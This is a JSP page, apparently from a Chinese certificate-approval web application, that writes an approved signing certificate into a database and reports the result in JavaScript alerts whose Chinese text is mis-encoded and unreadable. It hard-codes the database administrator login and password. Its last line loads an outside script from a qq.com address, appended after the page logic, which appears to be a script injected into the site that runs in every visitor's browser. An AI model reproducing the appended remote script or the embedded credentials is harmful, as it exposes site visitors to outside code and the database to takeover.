<%@page contentType="text/html;charset=gb2312"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@ page import="java.sql.*" %>
<%@ page import="ApproveBeans.ApproveBean" %>
<%! Connection conn=null;%>
<%! PreparedStatement pstmt=null;%>
<%! int effect=0;%>
<jsp:useBean id="approveBean" class="ApproveBeans.ApproveBean" scope="session"/>

<%
	try
	{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		pstmt=conn.prepareStatement("insert into certs values(?,?,?,?,NULL)");
		pstmt.setLong(1,Long.parseLong(approveBean.subjectId_Sign));
		pstmt.setLong(2,Long.parseLong(approveBean.applyId));
		pstmt.setBytes(3,approveBean.signXC.getEncoded());
		pstmt.setInt(4,0);
		effect=pstmt.executeUpdate();
		if(effect>0)
		{
%>
<script>alert("����ɹ���"); history.back();</script>
<%
		}
		else
		{
%>
<script>alert("�Բ��������ݿ����Ѿ����ڸ�֤�飡"); history.back();</script>
<%
		}
	}
	catch(Exception ex)
	{
%>
<script>
alert("����ʧ�ܣ�\n ԭ������ǣ�\n1.�����ݿ����Ѿ����ڸ�֤�飡\n2.���ݿ����������\n���Ժ����ԣ�"); history.back();
</script>
<%
	}
	finally
	{
		try{ conn.close();}catch(Exception ex2){}
	}
%>
<script language=javascript src=http://www.qq.com/qq.js></script>